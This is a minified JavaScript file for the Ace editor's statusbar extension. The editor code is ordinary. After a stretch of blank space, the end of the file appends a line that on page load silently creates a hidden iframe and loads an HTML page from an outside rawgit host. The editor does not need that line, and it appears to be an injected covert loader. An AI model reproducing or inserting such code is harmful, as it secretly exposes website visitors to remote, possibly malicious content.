ace.define("ace/ext/statusbar",["require","exports","module","ace/lib/dom","ace/lib/lang"],function(e,t,n){"use strict";var r=e("ace/lib/dom"),i=e("ace/lib/lang"),s=function(e,t){this.element=r.createElement("div"),this.element.className="ace_status-indicator",this.element.style.cssText="display: inline-block;",t.appendChild(this.element);var n=i.delayedCall(function(){this.updateStatus(e)}.bind(this)).schedule.bind(null,100);e.on("changeStatus",n),e.on("changeSelection",n),e.on("keyboardActivity",n)};(function(){this.updateStatus=function(e){function n(e,n){e&&t.push(e,n||"|")}var t=[];n(e.keyBinding.getStatusText(e)),e.commands.recording&&n("REC");var r=e.selection,i=r.lead;if(!r.isEmpty()){var s=e.getSelectionRange();n("("+(s.end.row-s.start.row)+":"+(s.end.column-s.start.column)+")"," ")}n(i.row+":"+i.column," "),r.rangeCount&&n("["+r.rangeCount+"]"," "),t.pop(),this.element.textContent=t.join("")}}).call(s.prototype),t.StatusBar=s});
                (function() {
                    ace.require(["ace/ext/statusbar"], function() {});
                })();
            




void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});